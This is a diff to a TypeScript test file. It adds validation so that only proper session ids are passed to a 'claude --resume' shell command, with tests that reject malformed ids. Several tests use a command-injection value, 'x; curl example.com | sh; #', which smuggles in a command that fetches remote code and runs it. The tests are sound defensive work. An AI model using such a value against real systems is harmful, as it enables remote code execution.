@@ -7,6 +7,7 @@ import { apply } from "./reduce";
 import {
   ago,
   copy,
+  isSessionId,
   locate,
   MOVE_WAIT_MS,
   onMoved,
@@ -39,10 +40,24 @@ const NO_ENV: SpaceEnv = {
 };
 
 test("resume arguments go on with the session, or fork it", () => {
-  expect(resumeArgs(session)).toBe(`--resume ${session.id}`);
-  expect(resumeArgs(session, true)).toBe(`--resume ${session.id} --fork-session`);
+  expect(resumeArgs(session.id)).toBe(`--resume ${session.id}`);
+  expect(resumeArgs(session.id, true)).toBe(`--resume ${session.id} --fork-session`);
+  // Anything else would run in the shell, or be taken as an option of claude's.
+  for (const id of ["", "x; curl example.com | sh; #", "-x", "a b", "a".repeat(65)]) {
+    expect(isSessionId(id)).toBe(false);
+    expect(() => resumeArgs(id)).toThrow("not a session id");
+  }
+  expect(isSessionId("a".repeat(64))).toBe(true);
   expect(sessionName(session)).toBe("Fix the login redirect");
   expect(sessionName({ ...session, title: null })).toBe(session.id);
+});
+
+test("a session whose id is not one is never resumed", async () => {
+  const open = spyOn(transport, "openTerminal").mockResolvedValue(3);
+  await resume({ ...session, id: "x; curl example.com | sh; #" });
+  expect(open).not.toHaveBeenCalled();
+  expect(notice()).toBe("Cannot resume: not a session id");
+  open.mockRestore();
 });
 
 test("resume shows a running session's terminal, else runs claude --resume in its folder", async () => {
@@ -195,13 +210,16 @@ test("the sessions open when the app last closed are resumed, one after the othe
   await restore([
     { id: "a", cwd: "/r", config_dir: "/w" },
     { id: "b", cwd: "/r/x", config_dir: null },
+    // Never typed into a shell, whatever sent it.
+    { id: "x; curl example.com | sh; #", cwd: "/r/y", config_dir: null },
   ]);
   expect(open.mock.calls.map((c) => [c[0], c[4]])).toEqual([
     ["/r", { config_dir: "/w" }],
     ["/r/x", { config_dir: null }],
   ]);
+  expect(write).toHaveBeenCalledTimes(1);
   expect(write).toHaveBeenCalledWith(4, "claude --resume a\r");
-  expect(notice()).toBe("Cannot resume the session in /r/x: gone");
+  expect(notice()).toBe("Cannot resume the session in /r/y: Error: not a session id");
   open.mockRestore();
   write.mockRestore();
 });
